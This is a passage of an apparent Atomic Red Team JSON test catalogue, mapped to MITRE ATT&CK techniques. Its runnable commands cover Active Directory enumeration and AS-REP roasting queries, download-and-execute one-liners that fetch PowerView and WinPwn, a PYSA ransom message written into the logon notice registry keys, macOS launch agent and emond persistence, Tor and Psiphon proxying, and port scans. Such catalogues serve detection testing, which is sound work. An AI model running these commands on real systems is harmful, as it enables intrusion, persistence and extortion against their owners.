				"description": "Computer must be domain joined.\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually.\n"
			},
			{
				"description": "Requires the Active Directory module for powershell to be installed.\n",
				"prereq_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n"
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind - Query Active Directory Groups",
		"auto_generated_guid": "48ddc687-82af-40b7-8472-ff1e742e8274",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) #{optional_args}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Active Directory Groups with Get-AdGroup",
		"auto_generated_guid": "3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"command": "Get-AdGroup -Filter *\n",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate Active Directory Groups with ADSISearcher",
		"auto_generated_guid": "9f4e344b-8434-41b3-85b1-d38f29d148d0",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n"
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)",
		"auto_generated_guid": "43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must be domain joined.\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually.\n"
			},
			{
				"description": "Requires the Active Directory module for powershell to be installed.\n",
				"prereq_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name\n"
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Get-DomainGroupMember with PowerView",
		"auto_generated_guid": "46352f40-f283-4fe5-b56d-d9a71750e145",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Get-DomainGroup with PowerView",
		"auto_generated_guid": "5a8a181c-2c8e-478d-a943-549305a01230",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Active Directory Enumeration with LDIFDE",
		"auto_generated_guid": "22cf8cb9-adb1-4e8c-80ca-7c723dfc8784",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_path": {
				"description": "Path to the file that ldifde will output",
				"type": "path",
				"default": "C:\\Windows\\temp"
			},
			"output_file": {
				"description": "The filename to be created by ldifde",
				"type": "string",
				"default": "atomic_ldifde.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PowerShell ActiveDirectory Module must be installed\n",
				"prereq_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n",
				"get_prereq_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"
			}
		],
		"executor": {
			"elevation_required": true,
			"command": "ldifde.exe -f #{output_path}\\#{output_file} -p subtree\n",
			"cleanup_command": "del #{output_path}\\#{output_file}\n",
			"name": "command_prompt"
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS",
		"auto_generated_guid": "d58d749c-4450-4975-a9e9-8b1d562755c2",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"domain": {
				"description": "The domain to be tested",
				"type": "string",
				"default": "example"
			},
			"top_level_domain": {
				"description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
				"type": "string",
				"default": "com"
			},
			"user": {
				"description": "username@domain of a user",
				"type": "string",
				"default": "user@example.com"
			},
			"password": {
				"description": "password of the user referenced inside user",
				"type": "string",
				"default": "s3CurePssw0rD!"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n",
				"prereq_command": "which ldapsearch\n",
				"get_prereq_command": "echo missing ldapsearch command; exit 1\n"
			}
		],
		"executor": {
			"elevation_required": false,
			"command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" \"(objectClass=group)\" -s sub -a always -z 1000 dn \n",
			"name": "sh"
		},
		"attack_technique": "T1069.002",
		"phases": ["discovery"]
	},
	{
		"name": "Replace Desktop Wallpaper",
		"auto_generated_guid": "30558d53-9d76-41c4-9267-a7bd5184bed3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"url_of_wallpaper": {
				"description": "URL pointing to the image file you wish to set as wallpaper",
				"type": "url",
				"default": "https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png"
			},
			"pointer_to_orginal_wallpaper": {
				"description": "Full path to where a file containing the original wallpaper location will be saved",
				"type": "string",
				"default": "$env:TEMP\\T1491.001-OrginalWallpaperLocation"
			},
			"wallpaper_location": {
				"description": "Full path to where the downloaded wallpaper image will be saved",
				"type": "string",
				"default": "$env:TEMP\\T1491.001-newWallpaper.png"
			}
		},
		"executor": {
			"command": "$url = \"#{url_of_wallpaper}\"\n$imgLocation = \"#{wallpaper_location}\"\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"\n$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{  \n    $wc.DownloadFile($url, $imgLocation)\n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{  \n    Write-Host(\"Cannot download $url\") \n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{    \n    $wc.Dispose()  \n}\n",
			"cleanup_command": "$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\nif (Test-Path -Path #{pointer_to_orginal_wallpaper} -PathType Leaf) {\n     $orgImg = Get-Content -Path \"#{pointer_to_orginal_wallpaper}\"\n     add-type $updateWallpapercode \n     [Win32.Wallpaper]::SetWallpaper($orgImg)\n}\nRemove-Item \"#{pointer_to_orginal_wallpaper}\" -ErrorAction Ignore\nRemove-Item \"#{wallpaper_location}\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1491.001",
		"phases": ["impact"]
	},
	{
		"name": "Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message",
		"auto_generated_guid": "ffcbfaab-c9ff-470b-928c-f086b326089b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"legal_notice_caption": {
				"description": "Title of ransom message",
				"type": "string",
				"default": "PYSA"
			},
			"legal_notice_text": {
				"description": "Body of ransom message",
				"type": "string",
				"default": "Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org"
			}
		},
		"executor": {
			"command": "$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption).LegalNoticeCaption\n$orgLegalNoticeText = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText).LegalNoticeText\n$newLegalNoticeCaption = \"#{legal_notice_caption}\"\n$newLegalNoticeText = \"#{legal_notice_text}\"\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force      ",
			"cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1491.001",
		"phases": ["impact"]
	},
	{
		"name": "Launch Agent",
		"auto_generated_guid": "a5983dee-bf6c-4eaf-951c-dbc1a7b90900",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"plist_filename": {
				"description": "filename",
				"type": "string",
				"default": "com.atomicredteam.plist"
			},
			"path_malicious_plist": {
				"description": "Name of file to store in cron folder",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
				"prereq_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"The shared library doesn't exist. Check the path\"; exit 1;\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\nsudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}\nsudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}\n",
			"cleanup_command": "sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}\nsudo rm ~/Library/LaunchAgents/#{plist_filename}\n"
		},
		"attack_technique": "T1543.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Event Monitor Daemon Persistence",
		"auto_generated_guid": "11979f23-9b9d-482a-9935-6fc9cd022c3e",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"script_location": {
				"description": "evil plist location",
				"type": "path",
				"default": "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"
			},
			"script_destination": {
				"description": "Path where to move the evil plist",
				"type": "path",
				"default": "/etc/emond.d/rules/atomicredteam_T1543_001.plist"
			},
			"empty_file": {
				"description": "Random name of the empty file used to trigger emond service",
				"type": "string",
				"default": "randomflag"
			}
		},
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "sudo cp #{script_location} #{script_destination}\nsudo touch /private/var/db/emondClients/#{empty_file}\n",
			"cleanup_command": "sudo rm #{script_destination}\nsudo rm /private/var/db/emondClients/#{empty_file}"
		},
		"attack_technique": "T1543.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Launch Agent - Root Directory",
		"auto_generated_guid": "66774fa8-c562-4bae-a58d-5264a0dd9dd7",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"plist_filename": {
				"description": "filename",
				"type": "string",
				"default": "com.atomicredteam.T1543.001.plist"
			},
			"path_malicious_plist": {
				"description": "Name of file to store in cron folder",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "/Library/LaunchAgents must exist\n",
				"prereq_command": "if [ ! -d /Library/LaunchAgents ]; then mkdir /Library/LaunchAgents; exit 0; fi;\n",
				"get_prereq_command": "echo \"Failed to create /Library/LaunchAgents\"; exit 1;\n"
			},
			{
				"description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
				"prereq_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "sudo cp #{path_malicious_plist} /Library/LaunchAgents/#{plist_filename}\nlaunchctl load -w /Library/LaunchAgents/#{plist_filename}\n",
			"cleanup_command": "launchctl unload /Library/LaunchAgents/#{plist_filename}\nsudo rm /Library/LaunchAgents/#{plist_filename}\nsudo rm /tmp/T1543_001_atomicredteam.txt\n"
		},
		"attack_technique": "T1543.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Psiphon",
		"auto_generated_guid": "14d55ca0-920e-4b44-8425-37eedd72b173",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The proxy settings backup file must exist on disk at $env:Temp\\proxy-backup.txt\n",
				"prereq_command": "if (Test-Path $env:Temp\\proxy-backup.txt) {exit 0} else {exit 1}\n",
				"get_prereq_command": "if(-not (test-path $env:Temp\\proxy-backup.txt)){\n$Proxy = (Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -ErrorAction Ignore).ProxyServer\nSet-Content $env:Temp\\proxy-backup.txt $Proxy}\n"
			},
			{
				"description": "The Psiphon executable must exist in the Downloads folder\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\psiphon3.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://s3.amazonaws.com/0ubz-2q11-gi9y/psiphon3.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\psiphon3.exe\" \n"
			},
			{
				"description": "Batch file containing commands to run must be in src directory \n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1090.003\\src\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1090.003/src/Psiphon.bat\" -OutFile \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "& \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\"\n",
			"cleanup_command": "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction Ignore\nif($null -ne $Proxy) \n{Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -Value $Proxy}\n",
			"elevation_required": false
		},
		"attack_technique": "T1090.003",
		"phases": ["command-and-control"]
	},
	{
		"name": "Tor Proxy Usage - Windows",
		"auto_generated_guid": "7b9d85e5-c4ce-4434-8060-d3de83595e69",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"TorExe": {
				"description": "Location of tor.exe file.",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "tor.exe must be installed on the machine \n",
				"prereq_command": "if (Test-Path \"#{TorExe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://archive.torproject.org/tor-package-archive/torbrowser/11.0.6/tor-win32-0.4.6.9.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor.zip\"\nexpand-archive -LiteralPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor\"\n"
			}
		],
		"executor": {
			"command": "invoke-expression 'cmd /c start powershell -Command {cmd /c \"#{TorExe}\"}'\nsleep -s 60\nstop-process -name \"tor\" | out-null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1090.003",
		"phases": ["command-and-control"]
	},
	{
		"name": "Tor Proxy Usage - Debian/Ubuntu/FreeBSD",
		"auto_generated_guid": "5ff9d047-6e9c-4357-b39b-5cf89d9b59c7",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Tor must be installed on the machine \n",
				"prereq_command": "if [ -x \"$(command -v tor --version)\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "(which apt && sudo apt-get -y install tor) || (which pkg && pkg install -y tor)\n"
			}
		],
		"executor": {
			"command": "[ \"$(uname)\" = 'FreeBSD' ] && sysrc tor_enable=\"YES\" && service tor start || sudo systemctl start tor\n",
			"cleanup_command": "[ \"$(uname)\" = 'FreeBSD' ] && service tor stop && sysrc -x tor_enable || sudo systemctl stop tor\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1090.003",
		"phases": ["command-and-control"]
	},
	{
		"name": "Tor Proxy Usage - MacOS",
		"auto_generated_guid": "12631354-fdbc-4164-92be-402527e748da",
		"supported_platforms": ["macos"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Tor must be installed on the machine \n",
				"prereq_command": "if [ -x \"$(command -v tor --version)\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "if [ ! -x \"$(command -v brew --version)\" ]; then /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)\"; fi\nbrew install tor\n"
			}
		],
		"executor": {
			"command": "osascript -e 'tell application \"Terminal\" to do script \"tor\"'\n",
			"cleanup_command": "killall tor > /dev/null 2>&1\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1090.003",
		"phases": ["command-and-control"]
	},
	{
		"name": "Port Scan",
		"auto_generated_guid": "68e907da-2539-48f6-9fc9-257a78c05540",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"host": {
				"description": "Host to scan.",
				"type": "string",
				"default": "192.168.1.1"
			}
		},
		"executor": {
			"command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "Port Scan Nmap",
		"auto_generated_guid": "515942b0-a09f-4163-a7bb-22fefb6f185f",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"host": {
				"description": "Host to scan.",
				"type": "string",
				"default": "192.168.1.1"
			},
			"port": {
				"description": "Ports to scan.",
				"type": "string",
				"default": "80"
			},
			"network_range": {
				"description": "Network Range to Scan.",
				"type": "string",
				"default": "192.168.1.0/24"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if nmap command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "(which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which pkg && pkg install -y nmap)\n"
			},
			{
				"description": "Check if nc command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v nc)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "(which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)||(which pkg && pkg install -y netcat)\n"
			},
			{
				"description": "Check if telnet command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v telnet)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "(which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)\n"
			}
		],
		"executor": {
			"command": "sudo nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "Port Scan NMap for Windows",
		"auto_generated_guid": "d696a3cb-d7a8-4976-8eb5-5af4abf2e3df",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"nmap_url": {
				"description": "NMap installer download URL",
				"type": "url",
				"default": "https://nmap.org/dist/nmap-7.80-setup.exe"
			},
			"host_to_scan": {
				"description": "The host to scan with NMap",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "NMap must be installed\n",
				"prereq_command": "if (cmd /c \"nmap 2>nul\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" #{nmap_url}\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" /S\n"
			}
		],
		"executor": {
			"command": "nmap #{host_to_scan}",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "Port Scan using python",
		"auto_generated_guid": "6ca45b04-9f15-4424-b9d3-84a217285a5c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"host_ip": {
				"description": "Host to scan.",
				"type": "string",
				"default": "127.0.0.1"
			},
			"filename": {
				"description": "Location of the project file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1046\\src\\T1046.py"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if python exists on the machine\n",
				"prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
			}
		],
		"executor": {
			"command": "python \"#{filename}\" -i #{host_ip}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - spoolvulnscan",
		"auto_generated_guid": "54574908-f1de-4356-9021-8053dd57439a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - MS17-10",
		"auto_generated_guid": "97585b04-5be2-40e9-8c31-82157b8af2d6",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - bluekeep",
		"auto_generated_guid": "1cca5640-32a9-46e6-b8e0-fabbe2384a73",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - fruit",
		"auto_generated_guid": "bb037826-cbe8-4a41-93ea-b94059d6bb98",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "Network Service Discovery for Containers",
		"auto_generated_guid": "06eaafdb-8982-426e-8a31-d572da633caa",
		"supported_platforms": ["containers"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify docker is installed.",
				"prereq_command": "which docker\n",
				"get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
			},
			{
				"description": "Verify docker service is running.",
				"prereq_command": "sudo systemctl status docker  --no-pager\n",
				"get_prereq_command": "sudo systemctl start docker\n"
			}
		],
		"executor": {
			"command": "docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/\ndocker run --name t1046_container  -d -t t1046\ndocker exec t1046_container ./test.sh",
			"cleanup_command": "docker stop t1046_container\ndocker rmi -f t1046",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1046",
		"phases": ["discovery"]
	},
	{
		"name": "Port-Scanning /24 Subnet with PowerShell",
		"auto_generated_guid": "05df2a79-dba6-4088-a804-9ca0802ca8e4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ip_address": {
				"description": "IP-Address within the target subnet. Default is empty and script tries to determine local IP address of attacking machine.",
				"type": "string",
				"default": ""
			},
			"port_list": {
				"description": "Comma separated list of ports to scan",
				"type": "string",
				"default": "445, 3389"
			},
			"timeout_ms": {
				"description": "Connection timeout in milliseconds",
				"type": "string",
				"default": "200"
